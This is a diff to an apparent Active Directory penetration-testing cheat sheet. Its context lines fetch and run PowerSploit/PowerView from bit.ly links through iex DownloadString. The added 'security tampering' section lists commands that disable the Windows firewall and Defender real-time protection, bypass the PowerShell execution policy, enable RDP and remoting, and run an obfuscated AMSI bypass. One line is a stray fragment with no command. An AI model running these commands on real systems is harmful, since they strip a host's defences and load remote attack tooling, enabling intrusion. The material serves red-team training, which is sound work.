@@ -24,6 +24,43 @@ iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\Powe
 # PowerSploit Module
 iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1
 
+
+## PRE-REQUISITE: SECURITY TAMPRING
+
+# windows firewall showing / disabling config 
+netsh advfirewall set allprofiles state off
+netsh advfirewall show allprofiles
+
+# powershell execution protection bypass
+powershell -ep bypass
+
+# powershell fullLanguage / Constrained language mode
+# https://seyptoo.github.io/clm-applocker/
+$Env:__PSLockdownPolicy
+reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy /t REG_SZ /d ConstrainedLanguage /f
+/v fDenyTSConnections /t REG_DWORD /d 1 /f
+$ExecutionContext.SessionState.LanguageMode
+$ExecutionContext.SessionState.LanguageMode ConstrainedLanguage
+
+# powershell remoting enable / verify (Needs Admin Access)
+Enable-PSRemoting
+
+# RDP : enable / disable / check access
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+
+# WMI remoting as user authenticated on the Da / execution with DC privileges
+Set-RemoteWMI -UserName johndoe -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
+
+# Windows Defender disabling features
+Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+Set-MpPreference -DisableIOAVProtection $true
+
+# Windows Defender AMSI Bypass  
+# https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
+sET-ItEM ( &apos;V&apos;+&apos;aR&apos; +  &apos;IA&apos; + &apos;blE:1q2&apos;  + &apos;uZx&apos;  ) ( [TYpE](  "{1}{0}"-F&apos;F&apos;,&apos;rE&apos;  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f&apos;Util&apos;,&apos;A&apos;,&apos;Amsi&apos;,&apos;.Management.&apos;,&apos;utomation.&apos;,&apos;s&apos;,&apos;System&apos;  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f&apos;amsi&apos;,&apos;d&apos;,&apos;InitFaile&apos;  ),(  "{2}{4}{0}{1}{3}" -f &apos;Stat&apos;,&apos;i&apos;,&apos;NonPubli&apos;,&apos;c&apos;,&apos;c,&apos;  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
 ## LATERAL MOVEMENT
